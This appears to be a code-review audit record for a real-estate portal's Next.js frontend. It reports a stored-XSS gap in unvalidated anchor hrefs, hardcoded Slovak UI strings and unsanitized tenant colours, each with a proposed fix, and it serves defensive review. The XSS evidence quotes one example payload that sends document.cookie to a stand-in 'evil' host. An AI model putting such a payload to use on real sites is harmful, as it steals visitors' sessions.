landability_note: All three are frontend-only edits confined to frontend/apps/reality-web/src (no backend, no migration, no OpenAPI/api-client regen, no wire-shape change). F1 (href XSS): add a shared http(s)-only URL guard (e.g. lib/safe-url.ts safeExternalHref returning the url only if it parses to an http/https URL, else undefined) and apply it at the three raw-href sites; verifiable via a unit test asserting a `javascript:`/`data:` input yields undefined (no href emitted) and a normal https URL passes through. F2 (i18n): wrap the five hardcoded Slovak strings on app/[locale]/agency/[slug]/page.tsx in next-intl useTranslations keys (mirroring the sibling realtor/[id] page) and add the keys to messages/{en,sk,cs,de}.json; verifiable via `pnpm --filter @ppt/reality-web typecheck` + an existing-messages key-parity check. F3 (css injection / consistency): route agency.primaryColor/secondaryColor through the existing lib/tenant-config.ts sanitizeCssValue (or a color-literal guard) before interpolating into the inline linear-gradient; verifiable via a unit test feeding a non-color-literal value and asserting it is dropped. Each is independently landable; gate with `pnpm --filter @ppt/reality-web check && typecheck && test`.

evidence: frontend/apps/reality-web/src/app/[locale]/agency/[slug]/page.tsx:297 - the public agency profile renders `<a href={agency.website} target="_blank" rel="noreferrer">` with the agency-supplied website URL interpolated straight into href with NO scheme validation. `agency.website` is authored by the agency (a semi-trusted seller account) and served to anonymous portal visitors. React does not sanitize `javascript:` href values at runtime (it logs a dev-only warning since 16.9 but still renders the attribute), so an agency setting website to `javascript:fetch('//evil/'+document.cookie)` yields a stored-XSS payload that executes in the reality-portal origin when any visitor clicks the "Navštíviť web" link.

frontend/apps/reality-web/src/components/listings/sections/Resources.tsx:17 and :39 - the same raw-href pattern for listing-authored URLs: `href={listing.virtualTourUrl}` and `href={listing.floorPlanUrl}`, both target=_blank anchors with no http(s) scheme check. Same `javascript:` / `data:text/html` vector, authored at listing-edit time.

Project IS aware of the javascript:/data: URL class - lib/tenant-config.ts:243-262 sanitizeCssValue explicitly denylists `javascript:`/`data:`/`url(`/`expression(` for tenant css_vars, and its own comment (:231) notes logo URLs are deliberately routed to a non-executing `<link rel="icon">` to avoid exactly this. That guard is NOT applied to these three user-authored anchor hrefs - no safeExternalHref / isSafeUrl helper exists in reality-web, and grep for scheme checks (`https?:` / `startsWith('http`) over src/ returns only the tenant-config css path. This is the lone gap in an otherwise href-safe app.

Severity MEDIUM (+2): true stored-XSS vector but it requires (i) a semi-trusted authenticated agency/listing author to plant the payload and (ii) a victim click on the rendered link, which bounds blast radius below an unauthenticated reflected XSS. Confidence medium: the raw-href render path is confirmed by static read and React's non-sanitization of href is well established, but this pass did NOT confirm the absence of a server-side scheme validation on agency.website / *Url at write time in reality-server (not in scope for a frontend static pass) - if the backend already rejects non-http(s) schemes on write, this degrades to defense-in-depth. The remedy (an http(s)-only href guard at the three sites) is cheap and correct regardless.

frontend/apps/reality-web/src/app/[locale]/agency/[slug]/page.tsx is a `'use client'` component on a portal that is explicitly multi-language (sk/cs/de/en per frontend/apps/reality-web/CLAUDE.md and messages/{en,sk,cs,de}.json) yet renders user-facing copy as hardcoded Slovak literals with NO next-intl call anywhere in the file: :36 `Načítavam…` (loading), :46 `Kancelária sa nenašla.` (office not found), :223 `Žiadne aktívne ponuky.` (no active offers), :279 `Kontakt`, :302 `🌐 Navštíviť web` (visit web). grep for useTranslations/getTranslations/`t(` in the file returns zero matches.

The file's own header comment (:7-9) says it "Mirrors the realtor/[id] public-profile pattern" and references "next-intl", so i18n was intended but never wired - the sibling app/[locale]/realtor/[id]/page.tsx is the correct template to copy. Result: Czech, German, and English visitors to any agency public profile see Slovak UI chrome (loading state, empty state, not-found state, section headings, CTA).

Severity LOW (+1): i18n gap, no correctness/security impact, but a visible localization regression on a public SEO-indexed route. Confidence medium: directly observed from source (hardcoded literals + absence of any translation hook); the only reason it is not `high` is that this pass did not confirm whether these exact strings already have keys in messages/*.json awaiting wiring.
Not a duplicate: no existing reality-web code-review-finding row in backlog.json concerns agency-page i18n.

frontend/apps/reality-web/src/app/[locale]/agency/[slug]/page.tsx:64-66 interpolates agency-authored colors directly into an inline style value: `background: agency.primaryColor ? \`linear-gradient(135deg, ${agency.primaryColor}, ${agency.secondaryColor ?? '#2563eb'})\` : '…'`. `agency.primaryColor` / `agency.secondaryColor` are tenant-authored strings rendered without any validation.

This is the exact tenant-controlled-CSS class the project already hardened elsewhere: lib/tenant-config.ts:243-279 sanitizeCssValue was written specifically to guard tenant color/style values (denylists url(/expression(/javascript:/data:, enforces a color-literal shape for color-named vars, returns null to drop unsafe values). That helper is applied to css_vars but is NOT applied to these inline agency gradient colors - a consistency gap with the app's own security posture.

Severity LOW (+1): exploitability is limited because the value is assigned via a React inline-style object (el.style.background), where the CSSOM setter treats the whole string as a single property value and drops it if invalid - breaking out to a new declaration or to script is not straightforward, so this is primarily a defense-in-depth / consistency gap rather than a confirmed injection. Confidence medium: the unsanitized interpolation is confirmed by static read; actual exploitability was not runtime-verified (and is believed low per the CSSOM-setter behavior). Remedy is cheap and matches existing code: pass primaryColor/secondaryColor through sanitizeCssValue (or a hex/rgb/hsl color-literal guard) before interpolation.
